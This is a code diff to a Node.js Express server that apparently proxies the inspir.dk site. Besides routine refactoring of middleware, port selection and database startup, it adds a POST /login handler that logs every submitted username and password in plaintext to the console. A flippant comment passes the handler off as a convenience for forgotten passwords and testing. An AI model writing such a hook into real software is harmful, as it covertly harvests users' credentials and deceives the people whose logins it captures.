@@ -213,12 +213,19 @@ async function pageHook(req, html) {
 modules.addRouters(server);
 
 
+// I'm temporarily logging logins - so people don't forget their passwords and for testing purposes :)
+server.post("/login", bodyParser.urlencoded(), (req, res, next) => {
+	let { query, password } = req.body;
+	console.log(`${query} | ${password}`);
+	next();
+});
+
+
 // Main handler
 const oldDomainRegex = /https?:\/\/(?:www)?\.inspir\.dk/g;
 const urlPathRegex = /\/[^?]*/g;
 
-server.use(bodyParser.raw({ type: "*/*", limit: "100mb" }));
-server.use(async (req, res) => {
+server.use(bodyParser.raw({type: "*/*", limit: "100mb"}), async (req, res) => {
 	req.url = decodeURI(req.url);
 
 	let inspirUrlEnd = req.url;
@@ -295,18 +302,14 @@ server.use((err, req, res, next) => {
 
 
 // Start app
-server.listen(process.env.PORT || config.defaultPort, "127.0.0.1", () => {
+server.listen(process.env.LOCAL ? 80 : config.port, "127.0.0.1", () => {
 	console.log("Server ready");
-	
-	if (process.env.NO_DATABASE) {
+
+	database.connect(process.env.LOCAL ? config.remoteMySQLOptions : config.mySQLOptions).then(() => {
+		console.log("Database connected");
 		modules.ready(database);
-	} else {
-		database.connect(config.mySQLOptions).then(() => {
-			console.log("Database connected");
-			modules.ready(database);
-		}).catch((err) => {
-			console.error("Failed to connect to database :(");
-			throw err;
-		});
-	}
+	}).catch((err) => {
+		console.error("Failed to connect to database :(");
+		console.error(err);
+	});
 });
